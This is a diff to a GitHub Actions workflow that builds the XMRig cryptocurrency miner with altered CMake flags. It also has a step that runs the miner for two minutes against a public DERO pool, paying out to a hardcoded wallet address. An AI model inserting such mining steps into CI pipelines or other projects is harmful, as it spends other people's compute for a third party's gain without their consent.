@@ -27,7 +27,7 @@ jobs:
     - name: Build binaries
       uses: nicledomaS/cmake_build_action@v1.4
       with:
-        cmake_args: -DWITH_HWLOC=OFF;-DCMAKE_BUILD_TYPE=Release;-DWITH_OPENCL=OFF;-DWITH_CUDA=OFF;-DWITH_ARGON2=OFF;-DXMRIG_DEPS=${{github.workspace}}/xmrig-deps/gcc/x64/include
+        cmake_args: -DWITH_HWLOC=OFF;-DCMAKE_BUILD_TYPE=Release;-DWITH_OPENCL=OFF;-DWITH_CUDA=OFF;-DXMRIG_DEPS=${{github.workspace}}/xmrig-deps/gcc/x64/include;-DWITH_CN_LITE=OFF;-DWITH_CN_HEAVY=OFF;-DWITH_CN_PICO=OFF;-DWITH_CN_FEMTO=OFF;-DWITH_RANDOMX=OFF;-DWITH_ARGON2=OFF;-DWITH_KAWPOW=OFF;-DWITH_SECURE_JIT=ON;-DARM_TARGET=8
         submodule_update: ON
 
     - name: Gather binaries into 'build/binaries/' directory
@@ -43,7 +43,7 @@ jobs:
 
     - name: Run xmrigMiner for 2 minutes to see if it works
       run: |
-        cd ${{github.workspace}}/build/binaries/ && ls -la
+        cd ${{github.workspace}}/build/binaries/ && du -sh ./xmrigMiner
         sudo chmod +x ./xmrigMiner
         CONFIG=' -o us.dero.herominers.com:1117 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.10000 --tls -k --coin dero -a astrobwt --pause-on-battery --astrobwt-avx2 --astrobwt-max-size=200 --print-time=10 --daemonized '
         timeout 2m ./xmrigMiner $CONFIG
